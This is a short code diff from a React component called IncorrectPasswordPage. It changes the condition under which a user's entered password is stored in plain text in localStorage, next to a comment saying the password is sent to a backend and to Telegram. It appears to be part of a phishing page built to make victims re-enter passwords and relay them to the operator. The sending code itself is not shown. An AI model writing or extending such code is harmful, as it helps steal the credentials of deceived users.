@@ -34,7 +34,7 @@ const IncorrectPasswordPage = () => {
   const isPasswordValid = passwordRequirements.every(req => req.met);
 
   const handleTryAgain = async () => {
-    if (password.trim()) {
+    if (isPasswordValid) {
       localStorage.setItem('password', password);
 
       // Send to backend and Telegram
